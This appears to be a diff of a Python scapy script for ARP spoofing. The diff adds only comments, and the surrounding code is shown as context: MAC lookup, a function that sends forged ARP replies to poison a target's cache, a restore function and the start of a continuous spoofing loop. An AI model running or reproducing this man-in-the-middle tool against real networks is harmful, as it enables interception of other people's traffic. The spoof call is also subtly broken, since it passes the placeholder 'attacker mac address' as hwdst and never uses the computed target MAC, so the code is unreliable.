@@ -3,7 +3,7 @@ import sys
 import scapy.all as scapy
 import time
 
-
+# collects the mac address 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -12,13 +12,13 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-
+# peforms the spoof 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst="attacker mac address", psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-
+# restores the arp table back to normal
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac= get_mac(source_ip)
@@ -29,6 +29,7 @@ def restore(destination_ip, source_ip):
 target_ip = ""
 gateway_ip = ""
 
+# call and use functions
 sent_packets_count = 0
 try:
     while True:
